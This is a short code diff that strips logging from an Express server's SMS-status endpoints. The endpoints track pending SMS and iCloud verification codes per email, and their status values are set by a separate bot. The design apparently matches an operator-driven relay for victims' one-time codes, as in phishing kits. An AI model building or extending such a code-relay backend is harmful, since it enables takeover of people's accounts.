@@ -571,7 +571,6 @@ app.post("/update-status", (req, res) => {
     // ✅ NEW: Handle SMS status updates
     if (pendingSMS[identifier]) {
       pendingSMS[identifier].status = status;
-      console.log(`✅ Updated pendingSMS[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
@@ -734,7 +733,6 @@ app.post("/check-sms-status", (req, res) => {
     // Check pendingSMS first
     if (pendingSMS[email]) {
       const smsStatus = pendingSMS[email].status;
-      console.log(`✅ SMS status for ${email}: ${smsStatus}`);
       
       // Map bot.js status values to frontend expectations
       if (smsStatus === "sms_accept") {
@@ -807,7 +805,6 @@ app.post("/resend-sms", async (req, res) => {
     // Reset SMS status to pending so polling works again
     if (pendingSMS[email]) {
       pendingSMS[email].status = "pending";
-      console.log(`📧 ${email} | SMS status reset to pending`);
     }
 
     res.json({ ok: true });
@@ -1014,7 +1011,6 @@ app.get("/check-sms-code-status", (req, res) => {
 
     if (pendingCodes[requestId]) {
       const status = pendingCodes[requestId].status;
-      console.log(`✅ iCloud SMS status for requestId ${requestId}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "sms_accept") {
